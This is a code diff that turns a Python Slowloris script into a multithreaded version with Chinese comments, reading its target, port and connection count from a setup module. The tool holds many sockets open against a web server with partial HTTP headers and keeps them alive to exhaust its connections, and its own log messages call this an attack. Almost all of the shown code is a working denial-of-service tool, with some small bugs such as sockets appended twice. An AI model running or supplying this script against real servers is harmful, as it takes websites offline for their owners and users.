@@ -1,168 +1,82 @@
-import argparse
 import logging
 import random
 import socket
-import sys
 import time
+import ssl
+import setup
+import threading
 
-parser = argparse.ArgumentParser(
-    description="Slowloris, low bandwidth stress test tool for websites"
+logging.basicConfig(
+    format="[%(asctime)s] %(message)s",
+    datefmt="%d-%m-%Y %H:%M:%S",
+    level=logging.INFO,
 )
-parser.add_argument("host", nargs="?", help="Host to perform stress test on")
-parser.add_argument(
-    "-p", "--port", default=80, help="Port of webserver, usually 80", type=int
-)
-parser.add_argument(
-    "-s",
-    "--sockets",
-    default=150,
-    help="Number of sockets to use in the test",
-    type=int,
-)
-parser.add_argument(
-    "-v", "--verbose", dest="verbose", action="store_true", help="Increases logging"
-)
-parser.add_argument(
-    "-ua",
-    "--randuseragents",
-    dest="randuseragent",
-    action="store_true",
-    help="Randomizes user-agents with each request",
-)
-parser.add_argument(
-    "-x",
-    "--useproxy",
-    dest="useproxy",
-    action="store_true",
-    help="Use a SOCKS5 proxy for connecting",
-)
-parser.add_argument("--proxy-host", default="127.0.0.1", help="SOCKS5 proxy host")
-parser.add_argument("--proxy-port", default="8080", help="SOCKS5 proxy port", type=int)
-parser.add_argument(
-    "--https", dest="https", action="store_true", help="Use HTTPS for the requests"
-)
-parser.add_argument(
-    "--sleeptime",
-    dest="sleeptime",
-    default=15,
-    type=int,
-    help="Time to sleep between each header sent.",
-)
-parser.set_defaults(verbose=False)
-parser.set_defaults(randuseragent=False)
-parser.set_defaults(useproxy=False)
-parser.set_defaults(https=False)
-args = parser.parse_args()
-
-# if len(sys.argv) <= 1:
-#     parser.print_help()
-#     sys.exit(1)
-#
-# if not args.host:
-#     print("Host required!")
-#     parser.print_help()
-#     sys.exit(1)
-
-if args.useproxy:
-    # Tries to import to external "socks" library
-    # and monkey patches socket.socket to connect over
-    # the proxy by default
-    try:
-        import socks
-
-        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, args.proxy_host, args.proxy_port)
-        socket.socket = socks.socksocket
-        logging.info("Using SOCKS5 proxy for connecting...")
-    except ImportError:
-        logging.error("Socks Proxy Library Not Available!")
-
-if args.verbose:
-    logging.basicConfig(
-        format="[%(asctime)s] %(message)s",
-        datefmt="%d-%m-%Y %H:%M:%S",
-        level=logging.DEBUG,
-    )
-else:
-    logging.basicConfig(
-        format="[%(asctime)s] %(message)s",
-        datefmt="%d-%m-%Y %H:%M:%S",
-        level=logging.INFO,
-    )
-
-if args.https:
-    logging.info("Importing ssl module")
-    import ssl
-
-list_of_sockets = []
-user_agents = [
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
-    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
-    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
-    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
-    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
-]
 
 
-def init_socket(ip):
+class Thread (threading.Thread):
+    def __init__(self, name):
+        threading.Thread.__init__(self)
+        self.name = name
+        # 目标IP地址
+        self.ip = ip
+        # 并发访问数
+        self.socket_count = socket_count
+        self.len = len
+
+    def run(self):
+        # 获得锁
+        thread_lock.acquire()
+        while len(list_of_sockets) < socket_count:
+            try:
+                logging.debug("Creating socket nr %s")
+                init_socket()
+            except socket.error as e:
+                logging.info(e)
+                break
+        # 释放锁
+        thread_lock.release()
+
+
+def init_socket():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.settimeout(4)
     # 目标端口
-    args.port = 8080
-    if args.https:
+    port = int(setup.port)
+    # ssl协议
+    is_ssl = setup.is_ssl
+    if is_ssl == 'yes':
         s = ssl.wrap_socket(s)
-
-    s.connect((ip, args.port))
-
+    s.connect((ip, port))
     s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
-    if args.randuseragent:
-        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
-    else:
-        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))
+    s.send("User-Agent: {}\r\n".format(random.choice(setup.user_agents)).encode("utf-8"))
     s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
+    list_of_sockets.append(s)
+    print(len(list_of_sockets))
     return s
 
 
 def main():
-    # 目标IP地址
-    ip = '127.0.0.1'
-    # 并发访问数
-    socket_count = 700
-    logging.info("Attacking %s with %s sockets.", ip, socket_count)
-
-    logging.info("Creating sockets...")
-    for _ in range(socket_count):
-        try:
-            logging.debug("Creating socket nr %s", _)
-            s = init_socket(ip)
-        except socket.error as e:
-            logging.debug(e)
-            break
-        list_of_sockets.append(s)
-
+    logging.info("尝试使用 %s 个连接攻击服务器 %s ", socket_count, ip)
+    logging.info("创建连接中...")
+    # thread()
+    # 使用多线程创建连接
+    t_thread1 = Thread('t1')
+    t_thread2 = Thread('t2')
+    t_thread3 = Thread('t3')
+    t_thread1.start()
+    t_thread2.start()
+    t_thread3.start()
+    # 添加线程到线程列表
+    threads.append(t_thread1)
+    threads.append(t_thread2)
+    threads.append(t_thread3)
+    # 等待所有线程完成
+    for t in threads:
+        t.join()
     while True:
         try:
             logging.info(
-                "发送请求头成功，当前并发数量: %s", len(list_of_sockets)
+                "发送请求头成功，当前数量: %s", len(list_of_sockets)
             )
             for s in list(list_of_sockets):
                 try:
@@ -171,23 +85,36 @@ def main():
                     )
                 except socket.error:
                     list_of_sockets.remove(s)
-
+                    logging.info(
+                        "部分连接与服务器断开，当前数量: %s", len(list_of_sockets)
+                    )
             for _ in range(socket_count - len(list_of_sockets)):
-                logging.debug("Recreating socket...")
+                logging.debug("重连中...")
+                if len(list_of_sockets) >= socket_count:
+                    break
                 try:
-                    s = init_socket(ip)
+                    s = init_socket()
                     if s:
                         list_of_sockets.append(s)
                 except socket.error as e:
                     logging.debug(e)
                     break
-            logging.debug("Sleeping for %d seconds", args.sleeptime)
-            time.sleep(args.sleeptime)
-
+            logging.info("Sleeping for %d seconds", sleep_time)
+            time.sleep(sleep_time)
         except (KeyboardInterrupt, SystemExit):
-            logging.info("Stopping Slowloris")
+            logging.info("停止Slowloris攻击")
             break
+    print("Exiting Slowloris")
 
 
 if __name__ == "__main__":
+    list_of_sockets = []
+    # 目标IP地址
+    ip = setup.ip
+    # 间隔时间
+    sleep_time = int(setup.sleep_time)
+    # 并发访问数
+    socket_count = int(setup.socket_count)
+    thread_lock = threading.Lock()
+    threads = []
     main()
